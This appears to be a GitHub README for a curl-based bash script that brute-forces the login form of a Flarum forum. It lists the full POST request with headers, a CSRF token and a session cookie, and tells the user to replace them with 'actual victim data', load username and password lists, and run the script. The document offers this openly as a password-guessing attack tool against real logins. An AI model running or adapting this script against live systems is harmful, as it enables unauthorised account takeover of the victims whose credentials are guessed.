# Overview
Brute force using curl for user/passford fields 

<img src="https://github.com/Alexandersfg4/pictures/blob/master/Screenshot%202021-02-07%20at%2015.03.01.png" height="500" width="600">


## Getting started
1. Change url/headers/X-CSRF-Token/cookies to actual victim data
```
Request (){
  5 curl -o /dev/null -s -w "%{http_code}\n" -X POST -H "Content-Type: applicat    ion/json" \
  6         -H "Accept: */*" \
  7         -H "Accept-Encoding: gzip, deflate" \
  8         -H "Accept-Language: en-us" \
  9         -H "Origin: http://172.16.4.3:8080" \
 10         -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) App    leWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15" \
 11         -H "Connection: keep-alive" \
 12         -H "Referer: http://172.16.4.3:8080/" \
 13         -H "X-CSRF-Token: qheH4dzPl0nSkjPlkIZtm3pIfX4pgjaAxVlWFI15" \      
 14         -H "Cookie: flarum_session=C9J70piUW3WDKAee3sf619I744n9ImW3ecPv3Lai    " \
 15         -d "{\"identification\":\"$user_in_file\",\"password\":\"$password_    in_file\",\"remember\":false}" \
 16         http://172.16.4.3:8080/login
 17 }
```
1. Add data to passwords.txt and usernames.txt files
1. And than run the script ``` ./bruteforce.sh ```
